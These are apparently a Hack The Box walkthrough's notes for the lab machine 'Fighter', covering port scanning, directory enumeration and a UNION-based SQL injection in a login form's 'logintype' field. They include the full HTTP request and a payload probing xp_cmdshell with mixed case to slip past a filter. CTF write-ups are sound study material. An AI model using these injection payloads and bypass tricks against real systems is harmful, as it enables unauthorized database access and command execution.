### Fighter

#### keyword, xP_cMdsHeLl

gobuster  

#### information

Nmap 7.70 scan initiated Thu Mar 21 09:11:51 2019 as: nmap -sC -sV -oA nmap 10.10.10.72
Nmap scan report for 10.10.10.72
Host is up (0.37s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: StreetFighter Club

#### **look the website**

firefox http://10.10.10.72/

"  We're
currently redesigning our website streetfighterclub.htb for a
new 
modern look and functionality. The new site should be up and running
soon.
Meanwhile our<span style=color:red> "old" members site is still available for our registered </span>
members (p.s you know the link...)"

#### edit /etc/hosts

10.10.10.72 streetfighterclub.htb members.streetfighterclub.htb

#### **Enum the website**

```
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://members.streetfighterclub.htb/ -f

[+] Mode         : dir
[+] Url/Domain   : http://members.streetfighterclub.htb/
[+] Threads      0
/old/ (Status: 403)

```

http://members.streetfighterclub.htb/old/login.asp

###  LoginType hava sql injection 

 there has a sql inject in [logintype]()  , payload is 1+union+select+1,2,3,4,5,6--+-　number [5]()   is the result on the Email of responder.

```shell
POST /old/verify.asp HTTP/1.1
Host: members.streetfighterclub.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://members.streetfighterclub.htb/old/Login.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Cookie: ASPSESSIONIDQASQRDRR=ABEDGDHBGDKGADJOBEJGOOAB; Email=; Level=%2D1; Chk=3506; password=cGFzczJ3b3Jk; username=YWRtaW4%3D; ASPSESSIONIDQATQQCRR=GPPJKHHBICJCCJKHKDFJJHIC
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&password=asdfasdf&logintype=1+union+select+1,2,3,4,5,6--+-&rememberme=ON&B1=LogIn

soft-IIS/8.5
Set-Cookie: Level=Ng%3D%3D; path=/
Set-Cookie: Email=NQ%3D%3D; path=/
Set-Cookie: Chk=2351; path=/
Set-Cookie: password=YXNkZmFzZGY%3D; expires=Fri, 20-Mar-2020 02:17:16 GMT; path=/
Set-Cookie: username=YWRtaW4%3D; expires=Fri, 20-Mar-2020 02:17:16 GMT; path=/
X-Powered-By: ASP.NET
Date: Thu, 21 Mar 2019 02:17:16 GMT
Connection: close
Content-Length: 132

<head><title>Object moved</title></head>

<body><h1>Object Moved</h1>This object may be found <a HREF="welcome.asp">here</a>.</body>
```

### check the xp_cmd shell 

username=admin&password=asdfasdf&logintype=1+union+select+1,2,3,4,(SELECT+CONVERT(INT,+ISNULL(value,+value_in_use))+AS+config_value+FROM++sys.configurations+WHERE++name+%3d+'xP_CmDsHeLl'),6--+-&rememberme=ON&B1=LogIn

remember <span style=color:red> xp_cmdshell to xP_CmDsHeLl </span>

that is good!